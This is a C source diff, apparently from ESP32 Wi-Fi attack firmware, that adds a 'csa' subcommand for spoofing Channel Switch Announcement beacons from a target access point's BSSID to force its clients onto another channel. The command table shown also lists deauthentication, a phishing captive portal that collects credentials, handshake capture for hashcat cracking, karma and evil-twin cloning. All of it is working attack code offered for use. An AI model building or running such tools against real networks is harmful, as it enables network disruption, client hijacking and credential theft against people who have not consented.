@@ -908,8 +908,71 @@ static int cmd_raw(int argc, char **argv)
         if (argc >= 5 && parse_mac(argv[4], sta)) dst = sta;
         uint8_t src[6]; fb_random_local_mac(src);
         len = fb_probe_resp(f, sizeof(f), dst, src, (const uint8_t *)argv[2], (int)strlen(argv[2]), ch);
+    } else if (strcmp(sub, "csa") == 0) {
+        if (argc < 4) {
+            printf("META,CSA,ERR,msg,need_args (raw csa <bssid> <new_ch> [count] "
+                   "[--ssid X] [--ch N] [--dry] [--yes])\n");
+            fflush(stdout);
+            return 1;
+        }
+        uint8_t bssid[6];
+        if (!parse_mac(argv[2], bssid)) {
+            printf("META,CSA,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
+        }
+        int new_ch = atoi(argv[3]);
+        if (!((new_ch >= 1 && new_ch <= 14) || (new_ch >= 36 && new_ch <= 177))) {
+            printf("META,CSA,ERR,msg,bad_channel\n"); fflush(stdout); return 1;
+        }
+        int count = (argc >= 5 && argv[4][0] != '-') ? atoi(argv[4]) : 3;
+        if (count < 1) count = 1;
+        if (count > 10) count = 10;
+
+        const char *ssid = NULL;
+        char ssidbuf[33] = {0};
+        int ch = 0;
+        bool dry = false;
+        for (int i = 4; i < argc; i++) {
+            if (strcmp(argv[i], "--dry") == 0) dry = true;
+            else if (strcmp(argv[i], "--ssid") == 0 && i + 1 < argc) ssid = argv[++i];
+            else if (strcmp(argv[i], "--ch") == 0 && i + 1 < argc) ch = atoi(argv[++i]);
+        }
+
+        /* 库里有这个 BSSID 就用它的信道与 SSID, 并且能从空口抓到真 beacon 来改;
+         * 库里没有就退到合成, 这时必须给 --ssid. */
+        const ap_entry_t *ap = wifi_db_find_ap(bssid);
+        if (ap) {
+            if (!ssid) { snprintf(ssidbuf, sizeof(ssidbuf), "%s", ap->ssid); ssid = ssidbuf; }
+            if (!ch) ch = ap->channel;
+        }
+        if (!ch) ch = 6;
+
+        if (!dry && !confirm_dangerous(argc, argv, "raw csa")) return 1;
+
+        static csa_result_t res;
+        esp_err_t e = wifi_attack_csa(bssid, ssid, (uint8_t)ch, (uint8_t)new_ch,
+                                      (uint8_t)count, dry, &res);
+        if (e != ESP_OK) {
+            printf("META,CSA,ERR,msg,csa_failed,code,%d\n", (int)e);
+            fflush(stdout);
+            return 1;
+        }
+        char bs[18];
+        mac_to_str(bssid, bs);
+        if (dry) {
+            printf("META,CSA,HEX,len,%d,data,", res.len);
+            for (int i = 0; i < res.len; i++) printf("%02x", res.bytes[i]);
+            printf("\n");
+            printf("META,CSA,DRY,ok,1,bssid,%s,from,%d,to,%d,cloned,%d,len,%d\n",
+                   bs, ch, new_ch, res.cloned ? 1 : 0, res.len);
+        } else {
+            printf("META,CSA,TX,ok,%d,bssid,%s,from,%d,to,%d,sent,%d,fail,%d,cloned,%d\n",
+                   res.sent > 0 ? 1 : 0, bs, ch, new_ch, res.sent, res.fail,
+                   res.cloned ? 1 : 0);
+        }
+        fflush(stdout);
+        return (res.sent > 0 || dry) ? 0 : 1;
     } else {
-        printf("META,RAW,ERR,msg,bad_subcmd (tx|deauth|auth|assoc|beacon|proberesp)\n");
+        printf("META,RAW,ERR,msg,bad_subcmd (tx|deauth|auth|assoc|beacon|proberesp|csa)\n");
         fflush(stdout);
         return 1;
     }
@@ -1661,7 +1724,7 @@ static const cli_cmd_t g_cmds[] = {
     { "phish",       "Captive portal (phishing AP)", "start|stop|status|stations|creds|html", cmd_phish, NULL },
     { "cap",         "Raw frame capture to flash", "start|stop|clear|info|keys|read|hdr", cmd_cap, NULL },
     { "hs",          "EAPOL handshake -> hashcat 22000", "[complete]|clear|22000|selftest", cmd_hs, NULL },
-    { "raw",         "Raw 802.11 frame builder / sender", "tx|deauth|auth|assoc|beacon|proberesp", cmd_raw, NULL },
+    { "raw",         "Raw 802.11 frame builder / sender", "tx|deauth|auth|assoc|beacon|proberesp|csa", cmd_raw, NULL },
     { "karma",       "Probe-request SSID harvester", "clear|follow <n>", cmd_karma, NULL },
     { "eviltwin",    "Clone target AP (SSID+BSSID+channel)", "clone <bssid> [push]|stop", cmd_eviltwin, NULL },
     { "blescan",     "BLE neighbor scan (board-side)", "start|stop|clear", cmd_blescan, NULL },
